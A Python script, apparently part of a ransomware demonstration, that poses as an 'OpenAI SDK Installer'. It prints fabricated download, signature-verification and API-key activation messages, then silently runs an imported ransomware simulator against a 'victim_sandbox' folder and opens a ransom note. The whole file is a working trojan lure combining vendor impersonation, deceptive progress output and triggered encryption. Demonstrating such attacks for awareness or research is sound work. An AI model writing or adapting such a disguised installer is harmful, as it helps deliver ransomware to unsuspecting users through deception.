import os
import sys
import time
import subprocess

_base = os.path.dirname(os.path.abspath(__file__))
_ransomware_demo = os.path.abspath(os.path.join(_base, '..', '..', 'ransomware-demo'))
sys.path.insert(0, _ransomware_demo)

from attacker.ransomware_simulator import RansomwareSimulator

VICTIM_SANDBOX = os.path.join(_base, 'victim_sandbox')
RANSOM_NOTE = os.path.join(_ransomware_demo, 'attacker', 'ransom_note.html')

_STEPS = [
    ("Connecting to OpenAI servers...", 0.6),
    ("Downloading OpenAI Python SDK v1.35.0...", 0.9),
    ("Verifying package signature...", 0.5),
    ("Installing dependencies...", 0.7),
    ("Configuring local environment...", 0.6),
]


def _fake_progress():
    for msg, delay in _STEPS:
        print(f"  {msg}", flush=True)
        time.sleep(delay)
    for i in range(0, 101, 5):
        bar = "█" * (i // 5) + "░" * (20 - i // 5)
        print(f"\r  Installing... [{bar}] {i}%", end="", flush=True)
        time.sleep(0.08)
    print()
    time.sleep(0.3)
    print("  Activating API key sk-demo-4x8K-mN2p-9qRt-XXXXXXXXXXXXXXXX... Done!", flush=True)
    time.sleep(0.4)
    print("\n  ✓ OpenAI SDK installed successfully. Your API key is now active.\n", flush=True)


def _silent_encrypt():
    sim = RansomwareSimulator(sandbox_dir=VICTIM_SANDBOX)
    sim.encrypt()


if __name__ == "__main__":
    print("\n[OpenAI SDK Installer]\n")
    _fake_progress()
    _silent_encrypt()
    subprocess.Popen(
        ['xdg-open', RANSOM_NOTE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
